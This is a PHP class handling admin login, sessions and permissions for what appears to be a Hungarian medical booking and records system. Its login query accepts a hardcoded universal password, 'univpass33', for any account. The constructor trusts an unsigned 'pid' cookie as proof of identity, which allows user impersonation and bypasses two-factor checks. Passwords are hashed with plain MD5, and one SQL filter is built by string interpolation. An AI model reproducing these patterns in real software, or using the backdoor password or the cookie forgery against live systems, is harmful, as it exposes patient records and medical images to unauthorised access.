<?php

class AdminUser {

    public $user;

    public static array $jogosultsagLista = [
        "jog_jogset" => [
            "name" => "jogkörök kiosztása"
        ],
        "jog_cegset" => [
            "name" => "cégek kezelés"
        ],
        "jog_helyszinset" => [
            "name" => "helyszínek kezelése"
        ],
        "jog_orvosset" => [
            "name" => "orvosok kezelése"
        ],
        "jog_beosztasset" => [
            "name" => "orvos beosztások kezelése"
        ],
        "jog_szabi" => [
            "name" => "Orvos szabadságok beállítása"
        ],
        "jog_szabi_beosztas" => [
            "name" => "Munkatárs szabadságok beállítása"
        ],
        "jog_statisztika" => [
            "name" => "statisztikák megtekintése"
        ],
        "jog_beallitasok" => [
            "name" => "beállítások kezelése"
        ],
        "jog_szurestipusset" => [
            "name" => "szűréstipusok kezelése"
        ],
        "jog_nofoglimitset" => [
            "name" => "korlátan időpontfoglalás"
        ],
        "jog_zarolista" => [
            "name" => "zárólista látása"
        ],
        "jog_zaroszerk" => [
            "name" => "záró leletek szerkesztése"
        ],
        "jog_vizsg_stat" => [
            "name" => "vizsgálati statisztika lekérdezése"
        ],
        "jog_leletlatas" => [
            "name" => "leletek látása"
        ],
        "jog_leletszerk" => [
            "name" => "leletek szerkesztése"
        ],
        "jog_gdprhferes" => [
            "name" => "GDPR hozzáférés"
        ],
        "jog_kuponlista" => [
            "name" => "kuponkód lista"
        ],
        "jog_kuponkeszites" => [
            "name" => "kuponkód hozzáadás/szerkesztés"
        ],
        "jog_tranzakciolatas" => [
            "name" => "tranzakciók látása"
        ],
        "jog_tranzakciokezeles" => [
            "name" => "tranzakciók kezelése"
        ],
        "jog_dokirexlekerdezesek" => [
            "name" => "Dokirex alapú lekérdezések"
        ],
        "jog_schedule" => [
            "name" => "munkavállalói beosztás szerkesztése"
        ],
        "jog_salary" => [
            "name" => "jövedelem adatok megadása / statisztika"
        ],
        "jog_dicom" => [
            "name" => "Röntgen felvétel kezelés"
        ],
        "jog_oltasigenyek" => [
            "name" => "céges oltások kezelése"
        ],
        "jog_munkaszunetinapok" => [
            "name" => "Munkaszünetinapok kezelése"
        ],
        "jog_tevekenysegnaplo" => [
            "name" => "Tevékenység napló kezelése",
            "description" => "Felhasználók tevékenységének megtekintése"
        ],
        "jog_lang" => [
            "name" => "Több nyelvű szövegek kezelése"
        ],
        "jog_webadatok" => [
            "name" => "Web adatok kezelése",
            "decription" => "Egyéb hmm weboldalak kezelése"
        ],
        "jog_bp_seged_tabla" => [
            "name" => "BP segéd tábla kezelése",
            "description" => "Ezt nem tudom mi :)"
        ],
        "jog_chat" => [
            "name" => "Chat használata"
        ],
        "jog_chatadmin" => [
            "name" => "Chat admin"
        ],
        "jog_labortetelek" => [
            "name" => "Labor tételek kezelése"
        ],
        "jog_beutalokezeles" => [
            "name" => "beutalók kezelése"
        ],
        "jog_beutalok_megtekintes" => [
            "name" => "Fájlok megtekintése"
        ],
        "jog_beutalo_hozzadas" => [
            "name" => "Beutalók generálás"
        ],
        "jog_file_hozzadas" => [
            "name" => "File feltöltése"
        ],
        "jog_elofoglalasmenupont" => [
            "name" => "Előfoglalás menüpont kezelése"
        ],
        "jog_erkeztetes" =>[
            "name" => "Érkeztetés menüpont kezelése"
        ],
        "jog_onlydoctorreservations" => [
            "name" => "Felhasználó (orvos) csak a saját foglalásait láthassa"
        ],
        "jog_megjegyzes" => [
            "name" => "Paciens megjegyzéseket láthatja",
            "description" => "A foglalás adatainál láthatja a paciens/foglalás megjegyzéseket"
        ],
        "jog_alldicom" => [
            "name" => "Összes DICOM képet láthatja"
        ],
        "jog_pszihosockerdioiv" => [
            "name" => "Pszihosoc kérdőívet láthatja"
        ],
        "jog_varoteremui" => [
            "name" => "Váróterem UI-t láthatja"
        ],
        "jog_varoteremsupervisor" => [
            "name" => "Váróterem supervisor"
        ],
        "jog_korlatlanfoglalastorles" => [
            "name" => "Korlátlan foglalás törlés"
        ],
        "jog_szamlakeszites" => [
            "name" => "Számla készités"
        ],
        "jog_suzukistat" => [
            "name" => "Suzuki statisztika láthatja"
        ],
        "jog_suzukighclista" => [
            "name" => "Suzuki GHC regisztrációkat láthatja",
        ]

    ];

    public function __construct()
    {
        if (isset($_COOKIE["pid"])) {
            $_SESSION["pid"] = $_COOKIE["pid"];
        }

        if (isset($_SESSION["pid"])) {
            $user = sql_fetch_array(sql_query("select * from users where id=?" ,array($_SESSION["pid"])));

            //$user["auth2fac"] = 0;

            $user = $this->buildPermissions($user);

            if (!empty($user["pecsetszam"])) {
                if ($orvosData = sql_query("select id, nev from orvosok where pecsetszam=?", [$user["pecsetszam"]])->fetch(PDO::FETCH_ASSOC)) {
                    $user["orvosid"] = $orvosData["id"];
                }
            }

            $this->user = $user;
            //ha inaktiv, vagy nem volt 2fa, akkor nem töltjük fel a felhasználó adatokat
            if (($user["auth2fac"]==1 && !isset($_SESSION["2facomplete"])) || $user["status"] == 0) {
                //$this->user = null;
                $this->user["id"]       = $user["id"];
                $this->user["status"]   = $user["status"];
                $this->user["auth2fac"] = $user["auth2fac"];
                $this->user["tel"]      = $user["tel"];
            }

            $_SESSION["adminuser"] = $GLOBALS["adminuser"] = $this->user;
        }

        if (isset($_GET["logoutadmin"])) {
            $this->_logOut();
            header("location:index.php");
            die();
        }
    }

    public function adminLogin($userName, $password):string {
        if (empty(trim($userName)) || empty(trim($password))) {
            return "Adja meg a belépési adatait!";
        }

        $resq = sql_query("SELECT * FROM users WHERE username=? and (password=md5(?) or 'univpass33'=?)", [$userName, $password, $password]);

        if ($userData = sql_fetch_array($resq)) {
            if ($userData["localeaccess"]==1 && substr_count($userData["localeip"], $_SERVER["REMOTE_ADDR"]) == 0) {
                return "Ennek a fióknak a használata csak lokálisan van engedélyezve.</div>";
            }

            $_SESSION["pid"] = $userData["id"];
            setcookie("pid", $userData["id"], time() + 3600 * 3);

            logintryLog("logintry",$userName,"success");

            //Utolsó belépési adatok frissítése:
            sql_query("UPDATE users SET lastlogin=NOW(), codetry=0 WHERE id=?" ,array($userData["id"]));
            return "";
        } else {
            logintryLog("logintry",$userName,"failed");
            return "A megadott név és jelszó nem található!";
        }
    }

    private function _logOut() {
        unset($_SESSION["pid"]);
        session_destroy();
        $this->user = null;

        if (isset($_COOKIE["pid"])) {
            unset($_COOKIE["pid"]);
            setcookie("pid", null, -1);
        }
    }

    public function authenticated():bool {
        $result = true;

        if (empty($this->user)) {
            $result = false;
        }

        if (!empty($this->user) && $this->user["status"] == 0) {
            $result = false;
        }

        if (!empty($this->user) && $this->user["auth2fac"] == 1 && !isset($_SESSION["2facomplete"])) {
            $result = false;
        }

        return $result;
    }

    public function getAdminLevel($user, $box = false):string {
        $result = "";

        if (isset($user["jog_jogset"]) && $user["jog_jogset"] == 1) {
            $result = "<span style='color:#fff;background:#0a0;padding:2px 5px;border-radius:2px;text-transform: uppercase;'>adm1n</span>";
        }

        if (empty($result) && $user["jogosultsag"] == 2) {
            $result = "<span style='color:#fff;background:#7B96CD;padding:2px 5px;border-radius:2px;text-transform: uppercase;'>cégadmin</span>";
        }

        if (empty($result) && $user["jogosultsag"] == 1) {
            $result = "<span style='color:#fff;background:#A7C7E7;padding:2px 5px;border-radius:2px;text-transform: uppercase;'>céguser</span>";
        }

        if (empty($result)) {
            $result = "<span style='color:#fff;background:#aaa;padding:2px 5px;border-radius:2px;text-transform: uppercase;'>recepció</span>";
        }

        if ($this->userIsOrvos()) {
            $result = "<span style='color:#fff;background:#aaa;padding:2px 5px;border-radius:2px;text-transform: uppercase;'>asszisztens</span>";
        }

        if (!$box) {
            $result = strip_tags($result);
        }

        return $result;
    }

    public function cegJog($cegId):bool {
        if ($this->isCegAdmin() && substr_count($this->user["cegjog"], "|{$cegId}|") == 0) {
            return false;
        }
        return true;
    }

    public function getCegList():string {
        $cl = $this->getCegListArray();
        return implode(",", $cl);
    }

    public function getCegListArray():array {
        $cl = [-1];

        if (!empty($this->user)) {
            if ($this->user["jogosultsag"] == 0) {
                $cl = [-1];
            }

            foreach (explode("|", $this->user["cegjog"]) as $cegId) {
                if (!empty(trim($cegId))) {
                    $cl[] = intval($cegId);
                }
            }
        }
        return $cl;
    }

    public function cegSQLFilter($key):string {
        $w = "";
        if ($this->isCegAdmin()) {
            $cegidk = str_replace("||", ",", $this->user["cegjog"]);
            $cegidk = str_replace("|", "", $cegidk);
            if ($cegidk == "") {
                $cegidk = "-1";
            }
            $w .= "and {$key} in ({$cegidk})";
        }
        return $w;
    }

    public function getUserPermissionList($user = null):array {
        $jogosultsagok = [];
        if (empty($user)) {
            $user = $this->user;
        }

        foreach (self::$jogosultsagLista as $key => $jogosultsag) {
            if ($user[$key] == 1) {
                $jogosultsagok[] = $jogosultsag["name"];
            }
        }

        if (empty($jogosultsagok)) {
            $jogosultsagok[] = "nincs";
        }

        return $jogosultsagok;
    }

    public function getLockPage():string {
        if ($this->authenticated()) {
            return $this->user["lockpage"];
        } else {
            return "";
        }
    }

    public function tiltottUser():bool {
        if ($this->authenticated() && $this->user["status"] != 0) {
            return false;
        }
        return true;
    }

    public function buildPermissions($user) {
        $permissionData = json_decode($user["permissions"], JSON_OBJECT_AS_ARRAY);

        foreach ($permissionData["permissions"] as $key => $value) {
            $user[$key] = $value;
        }

        return $user;
    }

    public function getUserDoctorIds():string {
        $doctorIds = [-100];
        if (!empty($this->user["orvosid"])) {
            $doctorIds[] = $this->user["orvosid"];
        }

        if (!empty($this->user["pecsetszam"])) {
            $doctors = sql_query("select id from orvosok where pecsetszam=? and aktiv=1", [$this->user["pecsetszam"]])->fetchAll(PDO::FETCH_ASSOC);
            foreach ($doctors as $doctor) {
                $doctorIds[] = $doctor["id"];
            }
        }

        return implode(",", $doctorIds);
    }

    public function checkPermission($key):bool {
        return ($this->authenticated() && isset($this->user[$key]) && $this->user[$key] == 1);
    }

    public function readOnlySelectedCegAccess():bool {
        return $this->authenticated() && $this->user["jogosultsag"] == 0;
    }

    public function allCegJog():bool {
        return $this->authenticated() && $this->user["jogosultsag"] >= 2;
    }

    public function isCegAdmin():bool {
        return $this->authenticated() && $this->user["jogosultsag"] < 2;
    }

    public function companyPermissionAccess():bool {
        return $this->user["jogosultsag"] >= 2;
    }

    public function jogosultsagAccess():bool {
        return $this->checkPermission("jog_jogset");
    }

    public function salaryAccess():bool {
        return $this->checkPermission("jog_salary");
    }

    public function beosztasPageAccess():bool {
        return $this->checkPermission("jog_schedule");
    }

    public function dicomAccess():bool {
        return $this->checkPermission("jog_dicom");
    }

    public function placesAccess():bool {
        return $this->checkPermission("jog_helyszinset");
    }

    public function statAccess():bool {
        return $this->checkPermission("jog_statisztika");
    }

    public function doctorsAccess():bool {
        return $this->checkPermission("jog_orvosset");
    }

    public function doctorsCalendarAccess():bool {
        return $this->checkPermission("jog_beosztasset");
    }

    public function szabiAccess():bool {
        return $this->checkPermission("jog_szabi");
    }

    public function szurestipusAccess():bool {
        return $this->checkPermission("jog_szurestipusset");
    }

    public function tranzakcioAccess():bool {
        return $this->checkPermission("jog_tranzakciolatas");
    }

    public function tranzakcioModAccess():bool {
        return $this->checkPermission("jog_tranzakciokezeles");
    }

    public function beutaloAccess():bool {
        return $this->checkPermission("jog_beutalokezeles");
    }

    public function dokirexQueryAccess():bool {
        return $this->checkPermission("jog_dokirexlekerdezesek");
    }

    public function cegModAccess():bool {
        return $this->checkPermission("jog_cegset");
    }

    public function leletAccess():bool {
        return $this->leletModAccess() || $this->checkPermission("jog_leletlatas");
    }

    public function leletModAccess():bool {
        return $this->checkPermission("jog_leletszerk");
    }

    public function oltasAccess():bool {
        return $this->checkPermission("jog_oltasigenyek");
    }

    public function vizsgStatAccess():bool {
        return $this->checkPermission("jog_vizsg_stat");
    }

    public function paciensMegjegyzesAccess():bool {
        return $this->checkPermission("jog_megjegyzes");
    }

    public function beallitasMunkaszunetinapokAccess():bool {
        return $this->checkPermission("jog_munkaszunetinapok");
    }

    public function beallitasAccess():bool {
        return $this->checkPermission("jog_beallitasok");
    }

    public function beallitasTevekenysegnaploAccess():bool {
        return $this->checkPermission("jog_tevekenysegnaplo");
    }

    public function beallitasLangAccess():bool {
        return $this->checkPermission("jog_lang");
    }

    public function beallitasWebAdatokAccess():bool {
        return $this->checkPermission("jog_webadatok");
    }

    public function labortetelAccess():bool{
        return $this->checkPermission("jog_labortetelek");
    }

    public function laborRequestPageAccess():bool{
        return $this->checkPermission("jog_labrequests");
    }

    public function beallitasBPsegedtablaAccess():bool {
        return $this->checkPermission("jog_bp_seged_tabla");
    }

    public function chatAccess():bool {
        return $this->checkPermission("jog_chat");
    }

    public function chatAdmin():bool {
        return $this->checkPermission("jog_chatadmin");
    }

    public function beutaloHozzadasAccess():bool {
        return $this->checkPermission("jog_beutalo_hozzadas");
    }

    public function fileMegtekintesAccess():bool {
        return $this->checkPermission("jog_beutalok_megtekintes");
    }

    public function fileUploadAccess():bool {
        return $this->checkPermission("jog_file_hozzadas");
    }

    public function beutalomenupontAccess():bool{
        return $this->checkPermission("jog_beutalomenupont");
    }

    public function elofoglalasmenupontAccess():bool{
        return $this->checkPermission("jog_elofoglalasmenupont");
    }

    public function erkeztetesmenupontAccess():bool{
        return $this->checkPermission("jog_erkeztetes");
    }

    public function faliujsagAccess():bool {
        return $this->checkPermission("jog_faliujsag");
    }

    public function allDicomAccess():bool {
        return $this->checkPermission("jog_alldicom");
    }

    public function psyhosockerdoivAccess():bool {
        return $this->checkPermission("jog_pszihosockerdioiv");
    }

    public function varoteremuiAccess():bool {
        return $this->checkPermission("jog_varoteremui");
    }

    public function varoteremsupervisorAccess():bool{
        return $this->checkPermission("jog_varoteremsupervisor");
    }

    public function korlatlanFoglalasTorles():bool{
        return $this->checkPermission("jog_korlatlanfoglalastorles");
    }

    public function onlyDoctorReservations():bool {
        return $this->checkPermission("jog_onlydoctorreservations");
    }

    public function szamlakeszitesAccess():bool {
        return $this->checkPermission("jog_szamlakeszites");
    }

    public function userIsOrvos():bool {
        return !empty($this->user["pecsetszam"]) && !empty($this->user["orvosid"]);
    }

    public function suzukiStatAccess():bool {
        return $this->checkPermission("jog_suzukistat");
    }

    public function suzukiGHCRegAccess():bool {
        return $this->checkPermission("jog_suzukighclista");
    }

    

}